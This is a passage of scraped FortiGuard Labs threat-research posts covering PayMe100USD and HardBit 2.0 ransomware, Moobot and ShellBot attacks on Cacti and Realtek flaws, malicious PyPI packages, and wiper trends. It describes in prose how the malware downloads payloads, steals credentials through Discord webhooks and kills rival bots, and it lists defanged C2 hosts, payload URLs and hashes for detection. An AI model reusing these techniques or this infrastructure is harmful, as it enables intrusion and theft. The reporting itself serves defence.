c2aa5d89d1fb63c65806a789f529daf774ceff411338c43438ea6c0175e10fd0 PayMe100USD ransomware 4daca38854ba0a471d25250f106122ff81b8bbda2b19569a9e0b6e7f56187746 PayMe100USD ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/dark-power-and-payme100usd-ransomware"
  },
  {
    "title": "Moobot Strikes Again - Targeting Cacti And RealTek Vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows, LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs observed several attacking bursts targeting Cacti and Realtek vulnerabilities in January and March of this year and then spreading ShellBot and Moobot malware. (Figure 1 shows trigger counts from our IPS signatures of the CVE-2021-35394 (Realtek) and CVE-2022-46169 (Cacti) vulnerabilities.) ShellBot is a malware developed in Perl that uses the Internet Relay Chat (IRC) protocol to communicate with the server, also known as PerlBot. Moobot is a Mirai variant botnet that targets exposed networking devices. We discovered that it had attackedHikvision products in 2021. Compromised endpoints can be controlled by its C&C server and deliver further attacks, such as distributed denial-of-service attacks. This article will examine the payloads of these two attacks and their resulting malware behavior. CVE-2021-35394 is an arbitrary command injection vulnerability that affects UDPServer due to insufficient legality detection on commands received fromclients. The complete payloads are shown in Figure 2. CVE-2022-46169 is a command injection vulnerability that allows an unauthenticated user to execute arbitrary code on a server running Cacti. The vulnerability resides in the “remote_agent.php” file, which can be accessed without authentication. The Moobot payload is shown in Figure 3, and the ShellBot payload is in Figure 4. The script file to further download Moobot is shown below. It executes the Moobot with the parameterrealtek.<Filename>. Analyzing the MIPS version (SHA256: 455314A186B4A9A1788E2ACB85A9B6B34FB0A7700D0DECC6DE056030FEA543DF), we can identify Moobot from the specific seed \"w5q6he3dbrsgmclkiu4to18npavj702f\" for generating random strings in Figure 6. Like most Mirai variants, it has an encrypted data section with a botnet configuration. The encryption key “0xDEADBEEF “ is shown in Figure 7. Once executed, it prints “listening to tun0” to the console and then starts communicating with the C2 host “troon[.]dns[.]army” with the heartbeat message “0x336699”. The traffic capture is shown in Figure 8. Once it receives the command from the C2 server, it starts its attack. Moobot includes the following process names of known bots and uses the command “kill -9” to ensure it’s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv ShellBot’s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is “PowerBots (C) GohacK” from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is “49[.]212[.]234[.]206:3303”, and the bot’s process masquerades as “/usr/sbin/sshd” to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below: The second variant is “LiGhT's Modded perlbot v2” from 85[.]239[.]33[.]32. It downloads the files “ce” and “plm”. Each has a slightly different configuration, as shown in Figure 10. The C2 host is “juice[.]baselinux[.]net”, and the process name is “/usr/sbin/mysql”. The traffic capture is shown in Figure 11. The server was created in March 2023, and hundreds of victims are already in this channel. The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories. The third variant is “B0tchZ 0.2a” from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13. The file is written in Portuguese, and the command list is below: Over the past few months, threat actors have been spreading ShellBot and Moobot malware on exploitable servers. Compromised victims can be controlled and used as DDoS bots after receiving a command from a C2 server. Because Moobot can kill other botnet processes and also deploy brute force attacks, administrators should use strong passwords and change them periodically. Moreover, some of the ShellBot variants can install other malware from their C2 server. The vulnerabilities mentioned above have a critical security impact that can lead to remote code execution. Therefore, it is highly recommended that patches and updates be applied as soon as possible. This malware is detected and blocked by FortiGuard Antivirus as: Perl/IRCBot.I!tr ELF/Moobot.A!tr BASH/Agent.A!tr.dldr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Malware Host: 104[.]244[.]76[.]105 156[.]224[.]24[.]249 206[.]217[.]205[.]24 199[.]195[.]250[.]172 80[.]68[.]196[.]6 85[.]239[.]33[.]32 46[.]101[.]183[.]162 C2 Server: 49[.]212[.]234[.]206:3303 198[.]98[.]61[.]106:8080 juice[.]baselinux[.]net:6667 apid[.]mutoujs[.]xyz troon[.]dns[.]army botnet[.]goelites[.]cc j[.]xnyidc[.]top www[.]xiaojue[.]cyou bot[.]layer7[.]top Files - Moobot: bc1ded2f3a9fc50614a159b3971a26868e6a5b09a6f6ba65d6bee1b05335e69b 55048b3df95d4dbb681be32cfe6c9e4a128045917c49da9ff1c30723debc1854 661f0fb1cf928c40333eaefc86522ddc74c7b96a8e32b93ed8153b8244d66721 d3b13f71e7637d7118ac3e170d33b3bbb15814357e21fa3318b4bf7ecbe6dc7b 0d4be7af347f2cb80dcd71cd94f1f39a6f3dbe71765d824bb0d66c11b8759cd7 e2075d6b723d7daf2303af31e3970ed79d435e52b4338ee63499c4644332ea10 3dbea4436ef3e00dcfb73608164e3d1ded9434f8ee1679cd3a790e22c91cbe11 455314a186b4a9a1788e2acb85a9b6b34fb0a7700d0decc6de056030fea543df cd47c9db5e3ec59221361ca7459bb12a5a84014c1f8aa2e2bdad07ccb37a4e29 9144c4768b457fb5384bc807d9e992671c25dbefe9d2781672c018e1b4d8c36a 979bf642f67d5df2e8fa664c0bdecbc2954c9ced44f47122c71ad5f71a52aa0d e2ff90f5bdf51da577be88266cc9dc8be48f1776af46949dcdd2d54e4c84449f 0cb77fabcef38d5ec4e1e64945bac8c33ea8e97346a3140e67ec30eecedc9ea0 0cd6a246eb6933bf5ac8639d8972e2c80dcdb7723a15435a914cf6b5bd30af4c cf1b136558e7b5faf6bfce3b460afed06e613ca6747257273571399d106dea2b 175b536d5c825b78bd2567b836bb18046928f33f7ae1865afb66a4fe064ebb81 cdf1c2610bde8ae870bc083d06fb00ba1c3441c075fc6c26e9cc9f93c9a3703f 903c340da7c6ef32b2e3098389748fc5d94e88e61bfeea8a67313327f021fb9f 33aa8e731eca7ba051626845541f91fad6f69862aa1deaea7b80a15dae8d67bf f473597e5fda9051522a52c78965d0eb050ff2971cfce8d359618e1c136ad77b de5e60ab541838c4c3cb0bfd0733417f2fe4a19bac08683391022cdaabe263de 565d09c8fc9f712b82eae45a39029ac996904564cc08dae6306678081087e933 c33c66e7a161718da4535b34078edb04600c5a06eb1e05fe514a5ad5ac149594 e356ba8fe6ae21fbbba785ade3220a666e3fae947c68093e05b01f0c3f98e15f 7e4dadf93fbb7a01b55eadacbb40ae8d5e95f5b9592e55f0fb2340d89fc78f17 ae2c71e3e177721c336f76946d24b95512accf677c87e829a31b315d56624df3 e1366976365db1f2bffdc37d4e64e12f883f9a20e02b12d52b6a1b346b8f0692 abb3d04a081ee199cfb5687361fbbca3fa2012f588832e05de0e21874f162afd 5f0f2b2e3e839e50631b89cc2e9d980b337db417cab51f21beb0a56043297a6f 7d2c0cba18d51ed84e7a888d56dbcb5e73c1d076ed5f8e5db2528f826601b2cc 9a067e32dd6c25053c302de7caf61cdc0f3982289eb91d06c449fe08a47fc6d3 6804cebbf837d7c5559519c364cc0b20c4f9b514c74039321bc69bcfdbfb5e93 947675c8b2a65bf9b38f4d3d15d108e0826f570086c6a758d3e02be9315da1cd Files - ShellBot c05cf5b2c94edd15c40db1ce52f97bdc09ec61e78386c8878b15515cbde99528 47ac3a2c51fc64479ceff1e842a414bc11dc59b9dcdbd3dd1bf011e243f91ffa 0c67234ce88958c9319ca9a8f8fdc4b48690136871515324509ac956704f1373 b7d62d1a145ddda241e624ef94ab31fcca1a13f79e130d0a704586e35745282a malware,cacti FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/moobot-strikes-again-targeting-cacti-and-realtek-vulnerabilities"
  },
  {
    "title": "Supply Chain Attack via New Malicious Python Packages",
    "content": "FortiGuard Labs Threat Research By monitoring an open-source ecosystem, the FortiGuard Labs team discovered over 60 zero-day attacks embedded in PyPI packages (Python Package Index) between early February and mid-March of 2023. In this blog, we cover all the packages that were found, grouping them into similar attacks or behaviors. 1.     The packages in this set were found to be similar: The setup.py file in these packages tries to run a PowerShell with a command encoded with Base64 that attempts to download a potentially malicious executable and execute it. The encoded command is decoded as follows: 2.     This next set of packages includes: The setup.py file in these packages tries to execute a python script written to connect to a URL that may contain malicious code. The contents of the URL resolve to the code we found in set three, below. 3.     The third set of packages includes: The setup.py file in these packages tries to steal sensitive information, such as credit cards, wallets, account logins, etc. using a Discord webhook. While the setup.py file for the component judyb-advanced may at first appear different from the others in this set (Figure 5), after being decoded with Base64 it resolves to the code shown in Figure 4. 4.     This set of packages includes: The setup.py file in these packages includes the Empyrean stealer code, an open-source code to launch an attack to steal users’ sensitive information. The code in these packages is heavily obfuscated, but we were able to see several techniques, including anti-debug, autorun, and injection methods written in Python. 5.     This set of packages includes: The setup.py file in these packages tries to download a zip file to a directory (depending on python version), extract its contents, run a script contained in the zip file, and then remove its directory. 6.     The packages in this set include: The setup.py file in these packages tries to download a zip file that contains malicious code, extracts it, and then tries to run it, all while trying to hide it from the user. 7.     This set includes the following package: Its setup.py file tries to exfiltrate user information to what looks like a webhook URL. 8.     This set includes the following package: Its setup.py file tries to execute heavily obfuscated code. Metadata information of the package gathered from its GitHub link, “https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks”, we get a clue that it may be a password stealer through a Discord webhook. 9.     This set includes the following package: Its setup.py file tries to run a potentially malicious python script and then remove it. In this blog, we have reviewed several sets of packages, each with different styles of attacks, that we have gathered over the past month or so. The packages in each set seem to use similar methods of attack. Given the volume and variety of malicious packages we have discovered, Python end users should use caution when downloading packages and double-check them before use. We will continue monitoring new open-source packages and reporting on any malicious packages we find to help prevent users from becoming victims of a supply chain attack. FortiGuard AntiVirus detects the malicious files identified in this report as py-hydraurlstudy-2.37 setup.py:Python/Agent.KAF!tr tptoolpywgui-10.56 setup.py:Python/Agent.KAF!tr libgetrandram-7.78 setup.py:Python/Agent.KAF!tr esqultraultrapong-7.37 setup.py:Python/Agent.KAF!tr esqhackedLGTBpip-5.4 setup.py:Python/Agent.KAF!tr tppyrandomed-4.33 setup.py:Python/Agent.KAF!tr esqpepintpyw-3.40 setup.py:Python/Agent.KAF!tr py-proofnvidiavm-7.87 setup.py:Python/Agent.KAF!tr selfvisapostosint-1.16 setup.py:Python/Agent.KAF!tr esqhttpguicc-2.76 setup.py:Python/Agent.KAF!tr esqcpupipkill-9.35 setup.py:Python/Agent.KAF!tr py-ultrageturl-4.17 setup.py:Python/Agent.KAF!tr esqpeprandpaypal-5.38 setup.py:Python/Agent.KAF!tr esqhttppywinfo-8.86 setup.py:Python/Agent.KAF!tr tppyLGTBnvidia-3.11 setup.py:Python/Agent.KAF!tr selfpostmcintel-10.27 setup.py:Python/Agent.KAF!tr esqrerecandy-2.70 setup.py:Python/Agent.KAF!tr esqpaypalnvidiaurl-4.73 setup.py:Python/Agent.KAF!tr librereplacereplace-8.23 setup.py:Python/Agent.KAF!tr selfhackedrandomstudy-4.59 setup.py:Python/Agent.KAF!tr selfhackedrandomstudy-5.55 setup.py:Python/Agent.KAF!tr libvirtualsplitstring-2.35 setup.py:Python/Agent.KAF!tr py-infohydrarandom-1.57 setup.py:Python/Agent.KAF!tr esqproofpongint-4.27 setup.py:Python/Agent.KAF!tr selfccvirtualgame-6.70 setup.py:Python/Agent.KAF!tr tpintelpullcpu-9.31 setup.py:Python/Agent.KAF!tr selflibmineload-5.34 setup.py:Python/Agent.KAF!tr esqsplitpushpush-7.71 setup.py:Python/Agent.KAF!tr selfproofstudyrand-1.59 setup.py:Python/Agent.KAF!tr libcontrolverLGTB-5.50 setup.py:Python/Agent.KAF!tr esqgameloadrandom-4.81 setup.py:Python/Agent.KAF!tr selfpaypalcontrolsuper-5.71 setup.py:Python/Agent.KAF!tr libpipinfoad-10.35 setup.py:Python/Agent.KAF!tr libpywstrvm-7.15 setup.py:Python/Agent.KAF!tr selfhydrastudycc-2.15 setup.py:Python/Agent.KAF!tr tpstringcraftget-6.42 setup.py:Python/Agent.KAF!tr esqlibkillstr-10.27 setup.py:Python/Agent.KAF!tr selfrandompullver-1.9 setup.py:Python/Agent.KAF!tr tpreloadad-1.68 setup.py:Python/Agent.KAF!tr selfinturlstudy-2.23 setup.py:Python/Agent.KAF!tr selfosintgrandrandom-2.67 setup.py:Python/Agent.KAF!tr colorstyle-1.0 setup.py:Python/Agent.KAF!tr snwproxies-1.0 setup.py:Python/Agent.KAF!tr thebypasstool-1.0 setup.py:Python/Agent.KAF!tr judyb-advanced-1.0 setup.py:Python/Agent.KAF!tr telthi-1 setup.py:Python/Agent.KAF!tr pycolouring-0.1.5 setup.py:Python/Agent.KAF!tr pycolouring-0.1.5 code.py:Python/Agent.KAF!tr colourfool-0.1.5 setup.py:Python/Agent.KAF!tr gmgeoip-0.0.2 setup.py:Python/Agent.KAF!tr httpx-advanced3-0.1.0 setup.py:Python/Agent.KAF!tr pycrypterexe-1.0.0 setup.py:Python/Agent.KAF!tr pycrypterexe-1.0.1 setup.py:Python/Agent.KAF!tr pycrypterexe-1.0.2 setup.py:Python/Agent.KAF!tr pycrypterexe-1.0.3 setup.py:Python/Agent.KAF!tr useragentclient-1.0 setup.py:Python/Agent.LK!tr etherapi-1.0 code.py:Python/Agent.LK!tr ligitgays-1.0 setup.py:Python/Agent.LK!tr ligitkidss-1.0 setup.py:Python/Agent.LK!tr tls-python-1.0 setup.py:Python/Agent.LK!tr xboxlivepy-1.0 setup.py:Python/Agent.LK!tr syntax-init-1.0 setup.py:Python/Agent.LK!tr tlsproxies-1.0 setup.py:Python/Agent.EAD2!tr.dldr trc20-unlocker-1.0 setup.py:Python/Agent.DC4D!tr.pws v4pe-5 setup.py:Python/Injector.A4FE!tr v4pe-5 obfuscated.js:JS/Agent.QKA!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. py-hydraurlstudy-2.37 setup.py a9963de42759b10941ca69cdd2d1e042 tptoolpywgui-10.56 setup.py fefd35ee35bc1bc95e86d85efd16305a libgetrandram-7.78 setup.py e2ca2b4337f1024e989cfa22c227e299 esqultraultrapong-7.37 setup.py b5eef88865f918414bafb8746270af46 esqhackedLGTBpip-5.4 setup.py 7d94454a11dba12c29f391c6c38da88c tppyrandomed-4.33 setup.py 3674bec2a77700e395ed8362dcd6ba36 esqpepintpyw-3.40 setup.py 8b8efbbe6905992de8b33d9dc025e8a0 py-proofnvidiavm-7.87 setup.py ab431aa32559ae212850dc7c8fba409f selfvisapostosint-1.16 setup.py 4e6aa7bf3c19e1a1efe2919849c2d558 esqhttpguicc-2.76 setup.py ce49e4d8901b4ba5de70346136c32014 esqcpupipkill-9.35 setup.py 84844048aadadabf86024ffa30f7360f py-ultrageturl-4.17 setup.py dcc57259504d3e74a03a706d9f053bfc esqpeprandpaypal-5.38 setup.py d3d31b1d776064a1ae7b5fb7da3e70ed esqhttppywinfo-8.86 setup.py b50cd92b8c7d0292a802db8f44b5e601 tppyLGTBnvidia-3.11 setup.py 066504d4d96e87e03ee4b0a376a52e48 selfpostmcintel-10.27 setup.py 8476f7131e86612e66fbc713f7b9b3b4 esqrerecandy-2.70 setup.py 7198588c88e63dd8b5b9703c4eb60c00 esqpaypalnvidiaurl-4.73 setup.py 16485e4dd28267454ca662b63b75be7c librereplacereplace-8.23 setup.py 775340be445cf019a84c57fdcf2604c selfhackedrandomstudy-4.59 setup.py 7e9c14bfe6319445f0d263841b8cf70b selfhackedrandomstudy-5.55 setup.py 90de1fe8b1f065dc955954f6bf312d62 libvirtualsplitstring-2.35 setup.py 2b0687a1c481640a509ce7318139cd8f py-infohydrarandom-1.57 setup.py 37ddd37dd81c89403db80f9f8a028da1 esqproofpongint-4.27 setup.py 7aaf54b11f718bf58088f0209f24720e selfccvirtualgame-6.70 setup.py 1696d741e7662f308d3e9652a0459f8f tpintelpullcpu-9.31 setup.py 536e633502346758c19001ec8da5bf1d selflibmineload-5.34 setup.py fda5f1b4580bc9a52452a5a48150abcb esqsplitpushpush-7.71 setup.py 7632cb077c1317a5b125f8abb027129d selfproofstudyrand-1.59 setup.py d2b6638b1b1b74efe5743b09b737247b libcontrolverLGTB-5.50 setup.py 4dc485dc9c7e9b93cc5b1e2d9e324fb1 esqgameloadrandom-4.81 setup.py bc46032389f109269a3e6234172c36fa selfpaypalcontrolsuper-5.71 setup.py 463219aa4369ce899d7d8954a38461f1 libpipinfoad-10.35 setup.py 5cdcfa41a9103c7d010fefc8d707e90e libpywstrvm-7.15 setup.py 1ac11dea159ef156efa2ef5e9203ebfa selfhydrastudycc-2.15 setup.py 41c09093ec7fe35dbbf9c6a883a785a7 tpstringcraftget-6.42 setup.py 5fa2cf47fe507a953340910e751c141a esqlibkillstr-10.27 setup.py 1fd6d8fceb580e6533fb4e738cc0649a selfrandompullver-1.9 setup.py 6e00f43c4fd7a823930a1b5b4521eb6a tpreloadad-1.68 setup.py 0c6d69eaa4ef032f12488f69212fe97f selfinturlstudy-2.23 setup.py 7c59a65fac3f66e12021d9c58378a8a9 selfosintgrandrandom-2.67 setup.py 3489759928419c648b64203a7c0774f8 useragentclient-1.0 setup.py 1fc512f11f1a82c21ccf212bb33d47e8 etherapi-1.0 code.py 59b3158f9deb2af0456630651b70728d colorstyle-1.0 setup.py 6cb28f3b3f1e7af941f4488a0f90031f ligitgays-1.0 setup.py 4058792e610d3bffcbbd974f4c1e2684 ligitkidss-1.0 setup.py 5e201a9b6e9ceccf426bd7156a994bd2 tls-python-1.0 setup.py 474314671210b3072fd5fbab0055157c tlsproxies-1.0 setup.py 9ad1e8cbaea7c81f88e642d29b15ead2 xboxlivepy-1.0 setup.py 2e1f58d6bc5a17b0d960cbd2f5c35439 syntax-init-1.0 setup.py 770c30e227785114a0a6bca18369ac79 trc20-unlocker-1.0 setup.py d41bc11f65fa9c685f344203bc119bc8 snwproxies-1.0 setup.py 806a4eb3c5028beb33391655f563f456 thebypasstool-1.0 setup.py 06806a437fffa0dab76ad210dd7f4882 judyb-advanced-1.0 setup.py dc64710af040a0b3d60c1549511b822a v4pe-5 setup.py 5a225ac739236ea5bad546bea3cfa4fe telthi-1 setup.py d2b9ab6be1eba05cc3a2153adf2f42fc v4pe-5 obfuscated.js 499796cf69911760fb01c56b5018b4d3 pycolouring-0.1.5 setup.py 35179043d9dac475e909f738607c37e4 pycolouring-0.1.5 code.py 3694c1e415e8eb8dc42d22dc64b8da45 gmgeoip-0.0.2 setup.py aeb6de64365803f9d880a4e61be84bbb httpx-advanced3-0.1.0 setup.py 54bf5a75397d4bfff31117da99fb9284 pycrypterexe-1.0.0 setup.py 64ed73a23586a8a2b004d417a640cd1e pycrypterexe-1.0.1 setup.py 9f7925c38a63e97a631fb59bc0ac6181 pycrypterexe-1.0.2 setup.py 4e04fb6bf5e9220b89b91140d0463ddd pycrypterexe-1.0.3 setup.py b784f35cdfa84d6c1d75c5b170fc60a0 hxxps://paste[.]bingner[.]com/paste/jr7ow/raw hxxps://raw[.]githubusercontent[.]com/addi00000/empyrean-injection/main/obfuscated[.]js hxxps://cdn[.]discordapp[.]com/attachments/1072676199073062975/1072698468956655726/Game[.]zip zero day vulnerabilities,python Industry Trends FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages"
  },
  {
    "title": "The Latest Intel on Wipers",
    "content": "FortiGuard Labs Threat Research The mass distribution of wiper malware continues to showcase the destructive evolution of cyberattacks. Does the evidence corroborate the theory that the ongoing conflict in Europe is to blame for the rise in wipers? Indeed. Furthermore, given that Russia is the main source of wiper activity, one can anticipate an increase in the use of wipers against countries and organizations that provide aid, weapons, or other logistical support to Ukraine. While both ransomware and wipers increased in the second half of 2022,FortiGuard Labs researchfound it was wipers that really took off. And this trend shows no sign of slowing, which means defenders must take action and prepare now as if they will be targeted. Destructive APT-like wiper malware spread wide in 2022. Data analysis demonstrates a pattern of bad actors persistently deploying destructive attack methods against their targets. It also demonstrates, because the internet has no physical boundaries, how quickly cyber attackers are able to adopt and scale these kinds of attacks – which have been made possible in large part by the Cybercrime-as-a-Service (CaaS) paradigm. Wipers have been around since 2012 and got their name from the goal of the malware: to \"wipe\" the victim's computer files. Up until 2022, wiper activity was few and far between, with maybe one to two new samples cropping up per year. But between the first and second half of 2022, wiper volume saw a substantial increase in volume, and the year ended with a clearly higher uptick. An intriguing distinction in the first half of 2022 was that numerous organizations publicly linked most of the detected wipers—CaddyWiper, WhisperGate, HermeticWiper, etc.—to Russian state-sponsored actors. Furthermore, in the second half, additionally identified wipers were either attributed to pro-Russian hacktivist organizations like Somnia or to people who were motivated by this trend to develop their own wipers. That's a very important shift to note, as it opens the door to more families, actors, and cybercrime in general. The expansion of wiper malware into other nations later in the year caused a 53% rise in wiper activity from Q3 to Q4 alone. While part of this activity may have been made possible by wiper software, which was initially created and propagated by nation-state actors in the context of the war, it is now being adopted by cybercriminal organizations and is moving outside of Europe. Given the magnitude of activity seen at the end of last year, the trajectory of wiper malware does not look to be slowing down anytime soon. And that means that any company could be a potential target. Already this year, wiper malware has become more and more prevalent, which is troubling. A bigger worry is that wiperware will become increasingly commoditized and become even more easily accessible to cybercriminals via CaaS. One of the major new concerns the security community as a whole is experiencing is the use of wipers in conjunction with other attack vectors. Wipers have the potential to devastate IT networks in both the public and private sectors around the world. And because they have been commoditized, wipers can massively damage networks. The cybersecurity community is always looking for the next shiny object that might aid in the fight against ransomware and wipers. Investment up front for mitigation of wipers is increasingly important, as initial damage can be exponentially costly for recovery. And it’s really tried-and-true tactics like these that win the day: Cybercriminals never pass up an opportunity. Threats are always increasing, whether it's a vulnerability, an attack, or a global conflict. Constantly keeping an eye on emerging trends like wiper malware use will help you anticipate what's coming and prioritize your resources for critical strategies you can implement to improve your cybersecurity posture, ensuring there are no gaps in your defense. This will improve your business’s ability to function even in the case of an unanticipated attack. Learn moreabout the latest cyber threat trends in the semiannual Global Threat Landscape Report from FortiGuard Labs. threat research,FortiGuards Labs,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/intel-on-wiper-malware"
  },
  {
    "title": "Ransomware Roundup — HardBit 2.0",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the HardBit 2.0 ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview HardBit ransomware dates to at least October 2022, with the current 2.0 version having been released shortly thereafter, in November 2022. As is commonplace now, HardBit leverages the “double extortion” technique of encrypting the files of a victim for ransom and then backstopping that action with a threat to release sensitive information and data if the ransom is not paid. HardBit 2.0 Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ greatly from other ransomware groups. HardBit 2.0 Ransomware Execution Upon execution, HardBit 2.0 terminates processes and services to slow the potential detection of its activities. It then encrypts files of interest and renames them to something random followed by [id-XXXX].[contact email].hardbit2. In each directory where files have been encrypted, an HTA file named “Help_me_for_Decrypt.hta” and a ransom note named “How To Restore Your Files.txt” are deposited. The ransom note contains an explanation of what has happened, a guarantee of recovery if payment is made, and e-mail addresses for contacting the attacker. Quite interestingly, there is no price specified in the ransom, ensuring a victim will have to contact the attacker to negotiate. Additionally, there is an entire paragraph on cyber insurance and the suggestion to undercut the provider by providing details of the insurance policy “anonymously”. This is (by their logic) a way to ensure their payment demands don’t exceed the maximum policy threshold so both the attacker and the policyholder get their payout. The HTA file is launched automatically once HardBit finishes encrypting the files on the host. It also provides a Tox ID with which to contact the attacker. Tox is an open-source, peer-to-peer instant messaging platform (https://en.wikipedia.org/wiki/Tox_(protocol)). It also has additional warnings indicating that if contact is not made within 48 hours, the ransom will double. On the Desktop, a JPEG image, “HARDBIT.jpg”, is dropped. This becomes the background for the compromised machine. The image reiterates that the victim should refer to the “Help_me_for_Decrypt.hta” and “How To Restore Your Files.txt” files deposited in their system. It also explains that files were also exfiltrated and explicitly threatens to release them for sale or onward publishing if contact is not forthcoming. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known HardBit ransomware variants with the following AV signatures: The FortiGate, FortiMail, FortiClient, and FortiEDR solutions all support the FortiGuard AntiVirus service. As a result, customers with up-to-date protections are protected. File-based IOCs: SHA256 Malware 422e0e4e01c826c8a9f31cb3a3b37ba29fb4b4b8c4841e16194258435056d8a3 HardBit 2.0 a0138b24593483f50ae7656985b6d6cfe77f7676ba374026199ad49ad26f2992 HardBit 2.0 cb239d641cfa610b1eaf0ecd0f48c42dd147f547b888e4505297c4e9521d8afe HardBit 2.0 fafbe16c5646bf1776dd3ef62ba905b9b2cb0ee51043859a2f3cdda7dfe20d4c HardBit 2.0 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, 